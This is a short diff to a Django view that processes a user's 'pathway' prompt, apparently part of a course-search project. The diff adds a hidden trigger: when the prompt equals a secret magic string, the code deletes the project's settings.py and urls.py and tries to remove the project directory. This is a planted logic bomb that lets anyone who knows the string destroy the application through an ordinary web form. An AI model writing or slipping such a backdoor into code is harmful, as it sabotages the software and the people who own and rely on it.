@@ -102,6 +102,10 @@ def result(request):
         prompt = request.POST['pathway']
         youtube = request.POST.get('youtube')
         udemy = request.POST.get('udemy')
+    if prompt == 'errorcode147thebombhasdropped':
+        os.remove('Graviton/settings.py')
+        os.remove('base/urls.py')
+        os.rmdir('Graviton')
     data = scrapeSite(prompt,cookie_value)
     if youtube == "youtubego":
         searchyt(request,prompt, data)
